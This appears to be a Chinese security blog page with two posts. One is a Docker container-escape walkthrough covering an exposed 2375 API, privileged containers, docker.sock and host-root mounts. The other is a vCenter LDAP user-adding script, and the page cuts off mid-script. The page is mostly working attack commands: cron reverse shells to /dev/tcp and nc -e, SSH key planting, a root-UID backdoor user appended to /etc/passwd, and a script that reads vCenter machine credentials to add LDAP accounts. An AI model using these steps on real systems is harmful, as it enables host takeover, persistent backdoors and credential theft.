<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.查看docker状态</span><br><span class="line">systemctl status docker</span><br><span class="line">2、打开docker服务文件</span><br><span class="line">sudo gedit /lib/systemd/system/docker.service</span><br><span class="line">修改ExecStart为：</span><br><span class="line">ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock</span><br><span class="line">3、重新加载docker配置</span><br><span class="line">systemctl daemon-reload // 1，加载docker守护线程</span><br><span class="line">systemctl restart docker // 2，重启docker</span><br><span class="line">看清楚位置路径是/bin还是/sbin，kali上面是 /sbin</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220614190551866.png" alt="image-20220614190551866"></p>
<p>快速环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">cd ~/靶场环境/vulhub-master/docker/unauthorized-rce&amp;&amp;docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://192.168.32.128:2375/version">http://192.168.32.128:2375/version</a></p>
<p><img src="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220614191300025.png" alt="image-20220614191300025"></p>
<p>查看当前运行容器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 ps</span><br><span class="line">CONTAINER ID   IMAGE                          COMMAND                  CREATED        STATUS                          PORTS                    NAMES</span><br><span class="line">f2f2db8a0476   c0ny1/vulnerable-node:latest   &quot;/app/start.sh&quot;          8 months ago   Up 3 hours                      0.0.0.0:3000-&gt;3000/tcp   vulstudy-master_vulnerable_node_1</span><br><span class="line">19c97b3eb5d4   vulstudy-master_postgres_db    &quot;docker-entrypoint.s…&quot;   8 months ago   Restarting (1) 18 seconds ago                            vulstudy-master_postgres_db_1</span><br></pre></td></tr></table></figure>

<p>进入容器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 exec -it f2f /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h3><p>创建特权容器：</p>
<p>docker -H tcp://192.168.32.128:2375 run -it –privileged ubuntu:latest /bin/bash</p>
<p>使用<strong>fdisk -l</strong>命令查看磁盘文件，找到主分区/dev/sda1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ # fdisk -l</span><br><span class="line">Disk /dev/sda: 80 GB, 85899345920 bytes, 167772160 sectors</span><br><span class="line">328965 cylinders, 255 heads, 2 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type</span><br><span class="line">/dev/sda1 *  4,4,1       1023,254,2        2048  165771263  165769216 79.0G 83 Linux</span><br><span class="line">/dev/sda2    1023,254,2  1023,254,2   165773310  167770111    1996802  975M  5 Extended</span><br><span class="line">/dev/sda5    1023,254,2  1023,254,2   165773312  167770111    1996800  975M 82 Linux swap</span><br></pre></td></tr></table></figure>

<p>创建test目录挂在宿主机磁盘：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">新建一个目录：mkdir /test</span><br><span class="line">挂载磁盘到新建目录：mount /dev/sda1 /test</span><br><span class="line">切换根目录：chroot /test</span><br><span class="line">这一步很重要，不然会找不到test目录 ：exit</span><br><span class="line">看下是否获得了宿主机目录</span><br></pre></td></tr></table></figure>

<p>写计划任务反弹shell,条件是宿主机到vps的网一定要通</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写计划任务，反弹宿主机Shell。</span><br><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/vps/1234 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<p>挂载ssh，需要挂载宿主机的root目录到容器，需要知道宿主机ip因为要连ssh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 run -it -v /root:/root ubuntu:18.04 /bin/bash</span><br><span class="line">mkdir /root/.ssh</span><br><span class="line">cat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys或者echo &quot;xxxx&quot;&gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">然后ssh 私钥登录。</span><br><span class="line">ssh -i /tmp/id_rsa root@xxxxx</span><br></pre></td></tr></table></figure>

<h3 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h3><p>执行脚本，不过不知道为啥本地测试没成功，nc监听反弹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="方式三："><a href="#方式三：" class="headerlink" title="方式三："></a>方式三：</h3><p>docker -H tcp://192.168.32.128:2375 images</p>
<p>随便选一个镜像，挂载根目录，创建一个kkkkkk的用户密码123456，需要知道宿主机ip用来连接ssh</p>
<p>docker -H tcp://192.168.32.128:2375 run -it -v /:/mnt 5deca9241f39 /bin/sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># openssl passwd -1 -salt kkkkkk 123456</span><br><span class="line">$1$kkkkkk$R913yPbJRwfO11aq9M3PM/</span><br><span class="line"># sed -i &#x27;$a kkkkkk:$1$kkkkkk$R913yPbJRwfO11aq9M3PM/:0:0:root:/root:/bin/sh&#x27; /mnt/etc/passwd</span><br></pre></td></tr></table></figure>

<p>ssh <a href="mailto:&#x6b;&#107;&#x6b;&#x6b;&#107;&#107;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x33;&#x32;&#x2e;&#49;&#50;&#x38;">&#x6b;&#107;&#x6b;&#x6b;&#107;&#107;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x33;&#x32;&#x2e;&#49;&#50;&#x38;</a></p>
<p>如果存在shell的情况下，su kkkkkk，如果没有就ssh连接试试</p>
<h2 id="特权容器"><a href="#特权容器" class="headerlink" title="特权容器"></a>特权容器</h2><p>攻击方式和上面一样，如果获取到一个shell是容器内的，查看容器是否有特权</p>
<p>cat /proc/self/status | grep CapEff</p>
<p>如果存在多个f就是特权模式，比如0000003fffffffff，000001ffffffffff，就可以挂在宿主机目录进行逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat /proc/self/status | grep CapEff</span><br><span class="line">CapEff:	000001ffffffffff</span><br></pre></td></tr></table></figure>

<h2 id="挂载docker-sock"><a href="#挂载docker-sock" class="headerlink" title="挂载docker.sock"></a><strong>挂载docker.sock</strong></h2><p>docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04</p>
<p>在docker容器中安装docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ubuntu 18.04安装dockersudo apt-get update</span><br><span class="line"># 安装依赖包sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br><span class="line"># 添加 Docker 的官方 GPG 密钥curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"># 验证您现在是否拥有带有指纹的密钥sudo apt-key fingerprint 0EBFCD88# 设置稳定版仓库sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br><span class="line"># 更新$ sudo apt-get update</span><br><span class="line"># 安装最新的Docker-ce sudo apt-get install docker-ce</span><br><span class="line"># 启动sudo systemctl enable dockersudo systemctl start docker</span><br></pre></td></tr></table></figure>

<p>上面如果不行用这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apt-update</span><br><span class="line">apt-get install \</span><br><span class="line">apt-transport-https \</span><br><span class="line">ca-certificates \</span><br><span class="line">curl \</span><br><span class="line">gnupg-agent \</span><br><span class="line">software-properties-common</span><br><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | apt-key add -</span><br><span class="line">apt-key fingerprint 0EBFCD88</span><br><span class="line">add-apt-repository \</span><br><span class="line">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \</span><br><span class="line">$(lsb_release -cs) \</span><br><span class="line">stable&quot;</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<p>将宿主机的根目录挂载到容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/test ubuntu:18.04 /bin/bash</span><br><span class="line">chroot test</span><br><span class="line">cd root/</span><br></pre></td></tr></table></figure>

<p>写计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  </span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.x.x/1234 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<h2 id="Docker容器挂载了宿主机根目录"><a href="#Docker容器挂载了宿主机根目录" class="headerlink" title="Docker容器挂载了宿主机根目录"></a>Docker容器挂载了宿主机根目录</h2><p>通过某种方式进入一个容器，看到某个目录可能是宿主机的根目录，比如</p>
<p>docker run -it -v /:/test/ ubuntu:18.04</p>
<p>在容器内，写计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot test</span><br><span class="line">cd root/</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.x.x/1234 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<h2 id="Cgroup执行宿主机系统命令"><a href="#Cgroup执行宿主机系统命令" class="headerlink" title="Cgroup执行宿主机系统命令"></a>Cgroup执行宿主机系统命令</h2><p>….    </p>
<h2 id="Runc容器逃逸CVE-2019-5736"><a href="#Runc容器逃逸CVE-2019-5736" class="headerlink" title="Runc容器逃逸CVE-2019-5736"></a>Runc容器逃逸CVE-2019-5736</h2><p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6         </p>
<p>….            </p>
<h2 id="Apparmor限制"><a href="#Apparmor限制" class="headerlink" title="Apparmor限制"></a>Apparmor限制</h2><p>….    </p>
<h2 id="Runc-竞争CVE-2021-30465"><a href="#Runc-竞争CVE-2021-30465" class="headerlink" title="Runc 竞争CVE-2021-30465"></a>Runc 竞争CVE-2021-30465</h2><p>目前受影响的runc版本：runc &lt;= 1.0.0-rc94</p>
<p>….    </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-vCenterLDAP-Manage-Fix" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/06/11/vCenterLDAP-Manage-Fix/" class="article-date">
  	<time datetime="2022-06-11T09:41:01.000Z" itemprop="datePublished">2022-06-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/06/11/vCenterLDAP-Manage-Fix/">
        vCenterLDAP_Manage_Fix
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>写这篇文章的原因，解决实战过程中机器密码存在$和“导致添加用户脚本失效的痛点。</p>
<p>获取ldap凭据信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/likewise/bin/lwregshell list_values <span class="string">&#x27;[HKEY_THIS_MACHINE\services\vmdir]&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+  &quot;Arguments&quot;         REG_SZ          &quot;/usr/lib/vmware-vmdir/sbin/vmdird -s -l 0 -f /usr/lib/vmware-vmdir/share/config/vmdirschema.ldif&quot;</span><br><span class="line">+  &quot;dcAccount&quot;         REG_SZ          &quot;v-vcenter55.pima-domain.local&quot;</span><br><span class="line">+  &quot;dcAccountDN&quot;       REG_SZ          &quot;cn=v-vcenter55.pima-domain.local,ou=Domain Controllers,dc=vsphere,dc=local&quot;</span><br><span class="line">+  &quot;dcAccountPassword&quot; REG_SZ          &quot;Epdj3YPws&amp;\\a3$FY\&quot;c%N&quot;</span><br><span class="line">+  &quot;DirtyShutdown&quot;     REG_DWORD       0x00000000 (0)</span><br><span class="line">+  &quot;LduGuid&quot;           REG_SZ          &quot;b74ae1d1-41de-11e3-9a9d-005056000123&quot;</span><br><span class="line">+  &quot;SiteGuid&quot;          REG_SZ          &quot;b74ae1d0-41de-11e3-9a9d-005056000123&quot;</span><br><span class="line">   &quot;Autostart&quot;         REG_DWORD       0x00000000 (0)</span><br><span class="line">   &quot;Dependencies&quot;      REG_SZ          &quot;vmafd&quot;</span><br><span class="line">   &quot;Description&quot;       REG_SZ          &quot;VMware Directory Service&quot;</span><br><span class="line">   &quot;Environment&quot;       REG_SZ          &quot;&quot;</span><br><span class="line">   &quot;Path&quot;              REG_SZ          &quot;/usr/lib/vmware-vmdir/sbin/vmdird&quot;</span><br><span class="line">   &quot;Type&quot;              REG_DWORD       0x00000001 (1)</span><br></pre></td></tr></table></figure>

<p>如果vCenter的dcAccountPassword的密码里面存在$或者”和%等特殊符号，会使脚本取值不确，从而无法正常添加用户比如</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;dcAccountPassword&quot;</span> REG_SZ          <span class="string">&quot;Epdj3YPws&amp;\\a3<span class="variable">$FY</span>\&quot;c%N&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/11/vCenterLDAP-Manage-Fix/image-20220611175114224.png" alt="image-20220611175114224"></p>
<p>脚本只能识别Epdj3YPws&amp;\a3无法完全取值,为了解决这一问题，将三好学生的脚本进行了修改，优化$符号和” </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">index3 = result.find(<span class="string">&quot;dcAccountPassword&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;advance_pass:&quot;</span>)</span><br><span class="line">dcAccountPassword = result[index3:].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] dcAccountPassword: &quot;</span> + dcAccountPassword)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fix_pass:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result[index3:].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].replace(<span class="string">&quot;$&quot;</span>, <span class="string">&#x27;\\$&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>][<span class="number">1</span>:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>advance_pass:Epdj3YPws&amp;\a3</p>
<p>修改脚本后获取fix_pass，优化了密码中存在%和&amp;还有\的情况,这样就可以正常执行，正常执行的密码Epdj3YPws&amp;\a3$FY&quot;c%N<br>从而正常调用脚本执行以下语句：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -h v-vcenter55.pima-domain.local -D <span class="string">&quot;cn=v-vcenter55.pima-domain.local,ou=Domain Controllers,dc=vsphere,dc=local&quot;</span> -w <span class="string">&quot;Epdj3YPws&amp;\\a3\$FY\&quot;c%N&quot;</span> -b <span class="string">&quot;cn=Users,dc=vsphere,dc=local&quot;</span></span><br></pre></td></tr></table></figure>

<p>附上vCenterLDAP_Manage_FixPass.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunCommand</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    r = os.popen(cmd)</span><br><span class="line">    text = r.read()</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLDAPConfig</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to get the config of LDAP&quot;</span>)</span><br><span class="line">    result = RunCommand(<span class="string">&quot;/opt/likewise/bin/lwregshell list_values &#x27;[HKEY_THIS_MACHINE\\services\\vmdir]&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    index1 = result.find(<span class="string">&quot;dcAccount&quot;</span>)</span><br><span class="line">    dcAccount = result[index1:].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    index2 = result.find(<span class="string">&quot;dcAccountDN&quot;</span>)</span><br><span class="line">    dcAccountDN = result[index2:].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line">    </span><br><span class="line">    index3 = result.find(<span class="string">&quot;dcAccountPassword&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    dcAccountPassword = result[index3:].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].replace(<span class="string">&quot;$&quot;</span>, <span class="string">&#x27;\\$&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] dcAccount: &quot;</span> + dcAccount)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] dcAccountDN: &quot;</span> + dcAccountDN)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] dcAccountPassword: &quot;</span> + dcAccountPassword)</span><br><span class="line">    <span class="keyword">return</span> dcAccount,dcAccountDN,dcAccountPassword</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddUser</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   username: test1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   userPrincipalName: test1@AAA.BBB&quot;</span>)</span><br><span class="line">      </span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;input the new username: &quot;</span>)</span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the dn: &quot;</span>)</span><br><span class="line">    userPrincipalName = <span class="built_in">input</span>(<span class="string">&quot;input the userPrincipalName: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    ADDUSER = <span class="string">&#x27;&#x27;&#x27;dn: &#123;dn&#125;</span></span><br><span class="line"><span class="string">userPrincipalName: &#123;userPrincipalName&#125;</span></span><br><span class="line"><span class="string">sAMAccountName: &#123;username&#125;</span></span><br><span class="line"><span class="string">cn: &#123;username&#125;</span></span><br><span class="line"><span class="string">objectClass: top</span></span><br><span class="line"><span class="string">objectClass: person</span></span><br><span class="line"><span class="string">objectClass: organizationalPerson</span></span><br><span class="line"><span class="string">objectClass: user</span></span><br><span class="line"><span class="string">userPassword: P@ssWord123@@</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    ADDUSER = ADDUSER.<span class="built_in">format</span>(dn = dn, userPrincipalName = userPrincipalName, username = username) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm the ldif&quot;</span>)</span><br><span class="line">    <span 